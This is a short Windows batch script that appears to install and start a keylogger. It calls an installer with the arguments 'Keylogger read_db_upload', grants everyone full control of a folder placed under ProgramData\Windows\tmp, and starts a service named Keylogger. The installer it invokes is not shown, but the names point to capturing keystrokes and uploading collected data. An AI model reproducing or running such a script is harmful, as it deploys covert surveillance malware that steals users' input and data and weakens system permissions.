@echo off
cd /d %~dp0
call run-install.bat  Keylogger read_db_upload
icacls "C:\ProgramData\Windows\tmp" /T /grant everyone:F
net start Keylogger
